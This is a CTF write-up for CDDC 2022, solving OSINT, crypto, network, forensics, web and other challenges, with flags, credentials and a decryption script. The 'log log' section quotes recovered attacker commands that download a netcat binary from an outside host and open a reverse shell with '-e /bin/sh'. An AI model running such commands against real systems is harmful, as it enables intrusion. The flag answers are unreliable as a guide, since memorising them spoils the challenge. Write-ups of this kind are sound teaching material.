---
title: "CDDC 2022"
slug: "cddc-2022"
description: "Writeup for CDDC 2022"
cover: "/static/content/cddc-2022/cover.png"
featured: false
published: "2022-06-23"
tags: ["CTF", "writeup"]
---

# CDDC 2022 Writeup

---

# Ring 5

## OSINT

### The place

Points: 100

This is my favorite place!

But I don't know the phone number of this place.

If you give me the phone number of this place, I will give you a flag in return!

![place.jpeg](/static/content/cddc-2022/place.jpeg)

![Untitled](/static/content/cddc-2022/Untitled.png)

![Untitled](/static/content/cddc-2022/Untitled%201.png)

```
CDDC22{+4928418896097}
```

### flying squirrel

Points: 100

[Public_Key.file](/static/content/cddc-2022/Public_Key.file)

A flying squirrel.... I got a PGP key that he uses.

How can I get his e-mail?

![Untitled](/static/content/cddc-2022/Untitled%202.png)

```
CDDC22{naldaramgi@key.key}
```

### Darknet

Points: 100

Connect to the dark web and find 'drugking'!

[http://jrtftx52s2gfjr4pz3nyk6ph55bz5of6ahhy2rmxwzxqv46wbyeatxid.onion](http://jrtftx52s2gfjr4pz3nyk6ph55bz5of6ahhy2rmxwzxqv46wbyeatxid.onion/)

![Untitled](/static/content/cddc-2022/Untitled%203.png)

[flag.zip](/static/content/cddc-2022/flag.zip)

![Untitled](/static/content/cddc-2022/Untitled%204.png)

[Drug dealer caught after fingerprints identified in cheese holding picture](https://sg.news.yahoo.com/carl-stewart-cheese-picture-drug-dealer-liverpool-police-175835893.html?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAALd0MSkbEe_LX2YwwwmMJ02HkT772_nSo_Uqcrul2ZaBL47EBsv-GGwmMnwE5399cQxyESezgDqJx71HrmBBy-10WEW9cPsduzerQsCOS74MkFqYt5BRLExKQq_GsNiz63-SW0dHc4Q5YH_vOOCe1ey0hkfU1Mbit63i7s9RhBfv)

```
Password: carl_stewart
```

[flag.txt](/static/content/cddc-2022/flag.txt)

```
CDDC22{Be_c@r3fu1_wh3n_p0st1ng_p1ctures_0n_th@_1nt3rn3t}
```

### What’s your name?

Points: 100

I work for a fake photo company. My detailed information is in LinkedIn, so please refer to it.PS. My name is the Flag.

flag input method :

- Enter name in **lowercase**
- There is no space in the flag.
- if the names is Abcd Efg👉 **CDDC22{abcdefg }**

![Untitled](/static/content/cddc-2022/Untitled%205.png)

```
CDDC22{wolfgodafrid}
```

---

## Crypto

### **Vigenere**

Points: 100

I got a suspicious file.

Analyze and decode it and let me know what it is!

[VIGENERE_encrypt.txt](/static/content/cddc-2022/VIGENERE_encrypt.txt)

```
ns wyy ixsu kfmex rri tskcxipo tycwuyvb? sj wyy ukrr ds eox y ppyq, cme rcoh ry olya ylssd zgqilovc. ppyq mq MHBM22{z3pi_wgwtjo_4rb_34cc_abcnd0_gf4vpcxkc}
```

[Vigenere Cipher - Online Decoder, Encoder, Solver, Translator](https://www.dcode.fr/vigenere-cipher)

![Untitled](/static/content/cddc-2022/Untitled%206.png)

```
CDDC22{v3ry_simple_4nd_34sy_crypt0_ch4llenge}
```

---

## Network

### Some Sharks

Points: 100

Baby shark, doo doo doo doo doo doo

Mommy shark, doo doo doo doo doo doo

Some sharks : Please login to the website

Analyze the file and log in to the website.

[somesharks.pcap](/static/content/cddc-2022/somesharks.pcap)

![Untitled](/static/content/cddc-2022/Untitled%207.png)

```
admin:aklfj!JRFIASLZJFop1i02FJ102
```

![Untitled](/static/content/cddc-2022/Untitled%208.png)

```
CDDC22{S0me_Sh4rk5_4r3_k1nD_ISNt_1t?}
```

### SNMP

Points: 100

The printer's SNMP community was exposed and attacked.Analyze the packet to check the printer's community and obtain a flag with an SNMP request.

- oid value : iso.3.6.1.2.1.1.1.0

[printer_snmp.pcapng](/static/content/cddc-2022/printer_snmp.pcapng)

![Untitled](/static/content/cddc-2022/Untitled%209.png)

```
CDDC22{L34king_SNMP_C0mmunity_$}
```

---

## Forensics

### Unknown file

Points: 100

I don't know what kind of file this is. Open the file and Get the flag!

[Unknown_file.txt](/static/content/cddc-2022/Unknown_file.txt)

![Untitled](/static/content/cddc-2022/Untitled%2010.png)

![image.png](/static/content/cddc-2022/image.png)

- Change height to make the image a square

```

```

### Unknown file 2

Points: 100

I don't know what kind of file this is.

I think it's written in white...

Open the file and Get the flag!

[Unknown_file_2](/static/content/cddc-2022/Unknown_file_2.txt)

![Untitled](/static/content/cddc-2022/Untitled%2011.png)

![Untitled](/static/content/cddc-2022/Untitled%2012.png)

[Dummy.pdf](/static/content/cddc-2022/Dummy.pdf)

[guide.pdf](/static/content/cddc-2022/guide.pdf)

[Sample.pdf](/static/content/cddc-2022/Sample.pdf)

[W-9.pdf](/static/content/cddc-2022/W-9.pdf)

```

```

### Dump Jump

Points: 100

Let's dump jump together!

Let's open this file and dump jump it!

[GPT.vhd](/static/content/cddc-2022/GPT.vhd)

![Untitled](/static/content/cddc-2022/Untitled%2013.png)

![Untitled](/static/content/cddc-2022/Untitled%2014.png)

```
CDDC22{i_9ot_y0ur_6@cK_Ch0sen_0nE}
```

---

## Pwn

### Command Injection

Points: 100

[command_injection](/static/content/cddc-2022/command_injection.txt)

![Untitled](/static/content/cddc-2022/Untitled%2015.png)

![Untitled](/static/content/cddc-2022/Untitled%2016.png)

```
CDDC22{H3h3_1nject1ng_c0Mmand_Fun~!}
```

### Uninitialized

Points: 100

I want to go into the print flag menu.

Help me and I'll give you a flag!

![Untitled](/static/content/cddc-2022/Untitled%2017.png)

![Untitled](/static/content/cddc-2022/Untitled%2018.png)

![Untitled](/static/content/cddc-2022/Untitled%2019.png)

![Untitled](/static/content/cddc-2022/Untitled%2020.png)

```
CDDC22{Un1nitialz1ed_Var14ble_Fun_4nd_Pr0fit~!}
```

---

## Misc.

### Copy n Paste

Points: 100

[](https://www.rapidtables.com/web/tools/svg-viewer-editor.html)

![Untitled](/static/content/cddc-2022/Untitled%2021.png)

[output.txt](/static/content/cddc-2022/output.txt)

![Untitled](/static/content/cddc-2022/Untitled%2022.png)

![flag.png](/static/content/cddc-2022/flag.png)

```
CDDC22{S4V4G3_LOVE}
```

---

## Web

### **SQLogin**

Points: 100

I have a question! Can I query you?

Log in first.

![Untitled](/static/content/cddc-2022/Untitled%2023.png)

```
CDDC22{Th1s_i5_51mp1e_SQL_inj3ct10n}
```

### baby web

Points: 100

Please clean the garbage floating in space.

I'll give you a flag in return.

![Untitled](/static/content/cddc-2022/Untitled%2024.png)

```
CDDC22{H3lL0_Spac3_tr4v3l3r5}
```

---

## Reversing

### ARM

Points: 100

My arms are strong!

Do you want to analyze it?

![Untitled](/static/content/cddc-2022/Untitled%2025.png)

![Untitled](/static/content/cddc-2022/Untitled%2026.png)

```
CDDC22{R3versing_4rm_fun_AND_G00d!!}
```

---

---

# Ring 4

## Misc

### Hash Attack

Points: 100

I like hash, hash, and hash brown.

I'll give you a flag when I'm done with the hash.

[hash.txt](/static/content/cddc-2022/hash.txt)

```
de7d1b721a1e0632b7cf04edf5032c8ecffa9f9a08492152b926f1a5a7e765d7 : i
bc16f5825a9dafc8c245dc7cd93f4e671a9885035a73e6ef29c04f2d3863bfab : will
1c6333509debf060200eb6bbe28db307508da67c0e3c58088393e4cf09de596d : show
bb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2 : you
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0 : the
807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87 : flag
ed5eb9a37e2d8231af3388319b941995f6dc8755c56043d0cc52b5fe405a87de : now
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0 : the
807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87 : flag
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6 : is
6e0325c66f79b23b40bd426545749be8d2380bcf1ce38fe4a3c324038144f4b2
021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96
6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
9f4024faec10ef6d29aa32d7935d94b1a816fd4fe0359fbf12d49d44b5ff33b8
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
bb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
187897ce0afcf20b50ba2b37dca84a951b7046f29ed5ab94f010619f69d6e189
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
7383711c1b05e72a1eddda46d34365edf3736a7c23806ab39b9e6f403c9dd625
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
63212655f2e25a8f89eeb6653853cece8901e24c4a4c1dee70e53b68bad3e19c
bb7208bc9b5d7c04f1236a82a0093a5e33f40423d5ba8d4266f7092c3ba43b62
d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2
```

![Untitled](/static/content/cddc-2022/Untitled%2027.png)

```
i will show you the flag now the flag is {1_Love_you_more_than_ever!}
```

```
CDDC22{1_Love_you_more_than_ever!}
```

### PPS

The server room access password was leaked through the server room manager's phone. 

Analyze the button tone of the given phone to find out the server room access password.

- server room access password : *XXXXXXXX# (X is a number between 0 and 9)
- flag : CDDC22{*XXXXXXXX#} (wireless access password, 8 digits of the number)

[DTMF.mp3](/static/content/cddc-2022/DTMF.mp3)

![Untitled](/static/content/cddc-2022/Untitled%2028.png)

![Untitled](/static/content/cddc-2022/Untitled%2029.png)

```
CDDC22{*38492751#}
```

---

## Crypto

### Crack the password

Points: 100

What was our password?

If you give me my password, I will give you a flag.

[passwd](/static/content/cddc-2022/passwd.txt)

[shadow](/static/content/cddc-2022/shadow.txt)

[print_flag.py](/static/content/cddc-2022/print_flag.py)

[flag.zip](/static/content/cddc-2022/flag%201.zip)

![Untitled](/static/content/cddc-2022/Untitled%2030.png)

![Untitled](/static/content/cddc-2022/Untitled%2031.png)

![Untitled](/static/content/cddc-2022/Untitled%2032.png)

![Untitled](/static/content/cddc-2022/Untitled%2033.png)

```
Zip Password: userservicebatmanlovevictorybutterflyred
```

```
CDDC22{Dump3d_f1lesyst3m_4nd_sh4dow_f1le~}
```

### HMAC

A PhD in the Cryptographic Research Institute used HMAC and HKDF to encrypt important information.Decrypt important information and obtain flags by referring to the cryptographic design documentation.

[chal.enc](/static/content/cddc-2022/chal.enc)

[design.pdf](/static/content/cddc-2022/design.pdf)

```python
import hashlib
import hmac
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import HKDF
from Crypto.Hash import SHA256

chal_enc = open("chal.enc", "rb").read()
secret = b"Secret-Passphrase"
salt = b"LastStand-MessageKey"

h = hmac.new(salt, secret, hashlib.sha256)
HMAC = h.hexdigest()
print(HMAC)

base64 = base64.b64encode(h.digest())
print("Zip Password is : " + base64.decode())

secret_sha256 = hashlib.sha256(secret)
ikm = secret_sha256.hexdigest()
print(ikm)

hkdf = HKDF(secret_sha256.digest(), 0x30, salt, SHA256)
#print(hkdf)
key, iv = hkdf[:0x20], hkdf[0x20:]

print(key.hex())
print(iv.hex())

#aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
#aes = AES.new(key, AES.MODE_CTR, initial_value=iv)
#binary = aes.decrypt(chal_enc)
# if u see PKZIP then its correct alr
#print(binary[:10])
```

```
Key: 442a63a8358f2ccb618e2c7957b600e28590a77b004f6a2955d76598466e7066
IV: 04a1921575b38d5c0c93ab9b98f0b280
```

![Untitled](/static/content/cddc-2022/Untitled%2034.png)

[AES Encryption: Encrypt and decrypt online](https://cryptii.com/pipes/aes-encryption)

![Untitled](/static/content/cddc-2022/Untitled%2035.png)

```
504b03040a000900000036b9b35466be88243b0000002f00000004001c00666c61675554090003a73087625b34876275780b000104f5010000041400000099a56545f9c0ac7e25439ecde7d45e8dadb220ddec72319418a1b8658bbe96d184a556e39164f418158768aef8dbb092548e7c512d89a1603e5e81504b070866be88243b0000002f000000504b01021e030a000900000036b9b35466be88243b0000002f000000040018000000000001000000808100000000666c61675554050003a730876275780b000104f50100000414000000504b050600000000010001004a00000089000000000007070707070707
```

![Untitled](/static/content/cddc-2022/Untitled%2036.png)

![Untitled](/static/content/cddc-2022/Untitled%2037.png)

```
CDDC22{H4sh_b4sed_m3ssage_4uthent1cation_c0dE}
```

---

## OSINT

### Photographer

A photographer is missing.

If you could collect these influencer accounts and check them out, you'd find a clue.

All we need is a zip file and a password.

Find a clue and get the flag.

[Wolf-Rayet Star](https://wr0913.blogspot.com/)

![Untitled](/static/content/cddc-2022/Untitled%2038.png)

![Untitled](/static/content/cddc-2022/Untitled%2039.png)

[](https://instantusername.com/#/)

[JavaScript is not available.](https://twitter.com/unanimous209)

![Untitled](/static/content/cddc-2022/Untitled%2040.png)

![Untitled](/static/content/cddc-2022/Untitled%2041.png)

[secret.zip](https://drive.google.com/file/d/1DLaiByzRuPkyP5u3zNhOXFxs32P4gNCg/view)

[https://www.youtube.com/watch?v=EBhxnK50Gfs](https://www.youtube.com/watch?v=EBhxnK50Gfs)

![Untitled](/static/content/cddc-2022/Untitled%2042.png)

```
Zip Password: Wolf Ray3t st4r

CDDC22{LIVE_FOR_MY_MONEY}
```

---

## Networking

### WiFi

The wireless access password is too weak.We use WPA2 encryption, but we only use numbers for 8-digit passwords.2 digits of the password have already been exposed.Use the given wireless capture file to find out your wireless access password!

- wireless access password : 2XXXX2XX (X is a number between 0 and 9)
- flag : CDDC22{XXXXXXXX} (wireless access password, 8 digits of the number)

[wpa_crack.cap](/static/content/cddc-2022/wpa_crack.cap)

[Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)

![Untitled](/static/content/cddc-2022/Untitled%2043.png)

![Untitled](/static/content/cddc-2022/Untitled%2044.png)

![Untitled](/static/content/cddc-2022/Untitled%2045.png)

```
CDDC22{23501268}
```

---

## Web

### Test Site

I think we need to patch the vulnerability in nginx Web Server.

Please verify the vulnerability and get the flag.

![Untitled](/static/content/cddc-2022/Untitled%2046.png)

![Untitled](/static/content/cddc-2022/Untitled%2047.png)

![Untitled](/static/content/cddc-2022/Untitled%2048.png)

![Untitled](/static/content/cddc-2022/Untitled%2049.png)

```
CDDC22{dlrjtdmsvmfformdlqslek.gotjrgoehdkandmlaldjqtdjdy~answpvnfdjwntutjrkatkgkqslek!}
```

### log log

I think someone did something...Analyze the log, and tell me what happened!flag input method :

- The following fields are required to create the flag, and are separated by _
    - Name of Uploaded File
    - File name generated by malware
    - C2 domain
    - Reverse IPv4 address : Reverse Port
- Flags other than CDDC22 are lowercase characters.👉 **CDDC22{sample.py_cmd.php_test.com_1.2.3.4:5678}**

![Untitled](/static/content/cddc-2022/Untitled%2050.png)

![Untitled](/static/content/cddc-2022/Untitled%2051.png)

![Untitled](/static/content/cddc-2022/Untitled%2052.png)

![Untitled](/static/content/cddc-2022/Untitled%2053.png)

![Untitled](/static/content/cddc-2022/Untitled%2054.png)

```
48374: python -c 'with open("/tmp/12b19f0d75d1066372d384ef3b34b804", "wb") as f: import requests; f.write(requests.get("http://pwn.sagona.kr/netcat_static-le"));'

52797: chmod +x /tmp/12b19f0d75d1066372d384ef3b34b804

57088: /tmp/12b19f0d75d1066372d384ef3b34b804 -e /bin/sh 0x1b170a11 19994
```

![Untitled](/static/content/cddc-2022/Untitled%2055.png)

```
CDDC22{favicon.ico_12b19f0d75d1066372d384ef3b34b804_pwn.sagona.kr_27.23.10.17:19994}
```

---

---

# Ring 3

## OSINT

### Secret Message

“provides free public access to collections of digitized materials, including websites, software applications/games, music, movies/videos, moving images, and millions of books”...with this message, The spy left a comment.

“You will find the key with ’Cornell University’ and ‘herries’....wait! KEEP AN EYE ON THE PARADOX.”

flag input method :

- if comments left by spy is ABCDEF👉 **CDDC22{ABCDEF }**

![Untitled](/static/content/cddc-2022/Untitled%2056.png)

![Untitled](/static/content/cddc-2022/Untitled%2057.png)

![Untitled](/static/content/cddc-2022/Untitled%2058.png)

[The paradox of acting : Diderot, Denis, 1713-1784 : Free Download, Borrow, and Streaming : Internet Archive](https://archive.org/details/cu31924027175961)

![Untitled](/static/content/cddc-2022/Untitled%2059.png)

```
CDDC22{s3cretMe$$age}
```

---

## Web

### SPA

Log in as an administrator to obtain a flag.

![Untitled](/static/content/cddc-2022/Untitled%2060.png)

![Untitled](/static/content/cddc-2022/Untitled%2061.png)

![Untitled](/static/content/cddc-2022/Untitled%2062.png)

```
CDDC22{50urc3_m4p_15_h1dd3n_g3m}
```

---

## Crypto

### DSA

Communicators are communicating important information using hidden channels of electronic signatures.

The electronic signature used is a digital signature algorithm (DSA), and the following parameters are used.

```
p = 4349445962213346771005425232845727838336252528805558665990590240470749947810140632785570086210529055607857683115467490199117548707954653733811730248891247

q = 50174122860490288682454191145153181183821456872777196544604225860970223720817

g = 2174582142019644155276818137638393001160821529179916986818524855155980721678000683379339584218075071275840823045973601487223201645328337396122493007683309
```

The hash function used in DSA is SHA256.Analyze messages and signatures to uncover hidden information!

flag input method :

- if hidden information is A B C D E F👉 **CDDC22{A B C D E F}**

[messages.pdf](/static/content/cddc-2022/messages.pdf)

```
Dear G, I am beginning to feel guilty for not having replied to your letters sooner : the sad truth is that I have nothing serious to say about them... 

19138a8168a15ec8766867e3250e61f92ce02ad33b2b6f6f9e21d63b34889165
2811ba689e7c0c72798e0c23ea5c0676a75e7cf841c7e088835657e863374b2f
```

```
My dear S, Lately I have been thinking again about the general formalism of (Weil)cohomology and homology of schemes, and so doing, it seems to me that I have managed to find the correct definition of homotopic invariants.

102c9ed2ff0fe669a36639b71869f8a3a20868f6a29a898995aef5ac43116cea
2811ba689e7c0c72798e0c23ea5c0676a75e7cf841c7e088835657e863374b2f
```

```
Dear G, How are the categories? I read in the Tribu that you are in the processof writing them. Is this true, and have you temporarily abandoned the Multiplodocus? I would also like to know how the latter is getting on, and if we can count on a rapid publication.

29630c9018e65a541aa4a865c66106ec746328669841d05cb0519e8c50bfe04d
2811ba689e7c0c72798e0c23ea5c0676a75e7cf841c7e088835657e863374b2f
```

```
My dear S, Choquet has probably received the corrections of the proofs for Gauthier-Villars by now. I asked that 100 reprints of my article be sent to you, since there is no point sending them here to Harvard.

19138a8168a15ec8766867e3250e61f92ce02ad33b2b6f6f9e21d63b34889165
1a5d2b618387de2e8bdc5b1a684d0153a45b0c51e2fa8a99b5d0510b58de1461
```

```
Dear G, Your letter makes me want to take stock of what I am doing with localfields J.-P. Serre : The results stated in this letter were published in [ Se60b ]and [ Se61a ]

2a7a22486cb5b0562832ca2ea4a59deb50ff8a041ca22742b20c40cab6e78688
2811ba689e7c0c72798e0c23ea5c0676a75e7cf841c7e088835657e863374b2f
```

Notes :

- SHA256 hash value of message
    1. 3e33f8ef50fb32f6d62734c17f074798365dbfd51c7f301e7ae11bb9d0c2af3e
    2. 2b3165e91f79aee52e84ffd8104103e9a4cb037165972e3bd4620c74d9a259d3
    3. 441581547d29a7513a52b2121f589e8a8cccbe945d0c45f3c9f491ec2ea5b920
    4. 5e7787e6a858f9c4843c3c4a20cbb4b362f1212c570387d32ddfeb598ccd49e8
    5. a7192532964cd5df41d46daf4ed4ff8f43b75c8107428cce75c09ad9f4e2ae15
- Refer to the 'FIPS PUB 186-4' documentation for the DSA algorithm used.

[https://nvlpubs.nist.gov/nistpubs/fips/nist.fips.186-4.pdf](https://nvlpubs.nist.gov/nistpubs/fips/nist.fips.186-4.pdf)

```
Unsolved
```

---

---

# Ring 2

## Blockchain

### New info

[Blockstream Block Explorer](https://blockstream.info/testnet/address/mqeamNsqnmKvRHxvTDGaWpgzW3c5BLh4fX)

[Blockstream Block Explorer](https://blockstream.info/testnet/address/mufk6gzjEMKhADRMNNXP73YYTQdbTUrdLu)

```
1_C
2_D
3_D
4_C
5_2
6_2
7_{
8_C
9_4
10_N
11__
12_Y
13_0
14_U
15__
16_R
17_3
18_A
19_D
20__
21_M
22_3
23_S
24_S
25_4
26_G
27_3
28_?
29_?
30_}
```

```
CDDC22{C4N_Y0U_R3AD_M3SS4G3??}
```